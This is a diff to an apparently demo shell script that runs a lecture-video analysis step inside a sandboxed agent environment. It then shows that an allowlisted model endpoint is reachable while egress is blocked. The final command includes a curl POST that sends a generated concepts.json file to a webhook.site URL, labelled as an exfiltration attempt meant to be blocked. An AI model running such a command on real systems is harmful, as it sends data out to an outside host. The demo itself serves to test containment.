@@ -21,7 +21,7 @@ say "The agent is contained — tools provisioned inside the sandbox (via policy
 nemoclaw "$SB" exec --timeout 20 -- bash -lc 'echo "  yt-dlp $(/sandbox/.local/bin/yt-dlp --version 2>/dev/null) · ffmpeg $(/sandbox/.local/bin/ffmpeg -version 2>/dev/null | head -1 | cut -d" " -f3)"' 2>/dev/null | grep -E "yt-dlp|ffmpeg"
 
 say "8kEdu's analyze step runs INSIDE scoutclaw — Nemotron reasoning on lecture frames:"
-nemoclaw "$SB" exec --timeout 900 -- bash -lc "export PYTHONUSERBASE=/sandbox/.local; export PATH=/sandbox/.local/bin:\$PATH; export TACTILE_BASE_URL=http://host.openshell.internal:1234/v1; export TACTILE_MODEL=nvidia/nemotron-3-nano-omni; cd /sandbox; python3 analyze.py --backend lmstudio --data /sandbox/data --video $VID --genre how_to --limit 6 2>&1 | grep -E 'genre lens|concept|done'" 2>/dev/null | sed 's/^/  /'
+nemoclaw "$SB" exec --timeout 900 -- bash -lc "export PYTHONUSERBASE=/sandbox/.local; export PATH=/sandbox/.local/bin:\$PATH; export KEDU_BASE_URL=http://host.openshell.internal:1234/v1; export KEDU_MODEL=nvidia/nemotron-3-nano-omni; cd /sandbox; python3 analyze.py --backend lmstudio --data /sandbox/data --video $VID --genre how_to --limit 6 2>&1 | grep -E 'genre lens|concept|done'" 2>/dev/null | sed 's/^/  /'
 
 say "Same contained context: the allowlisted model is reachable, exfil is not:"
 nemoclaw "$SB" exec --timeout 30 -- bash -lc 'curl -s -o /dev/null -w "  Nemotron (allowed) → HTTP %{http_code}\n" --max-time 12 http://host.openshell.internal:1234/v1/models; curl -s -o /dev/null -w "  exfil the widgets it made → HTTP %{http_code}  ⛔ BLOCKED\n" --max-time 12 -X POST https://webhook.site/8kedu -d @/sandbox/data/'"$VID"'/concepts.json' 2>/dev/null | grep -E "Nemotron|exfil"
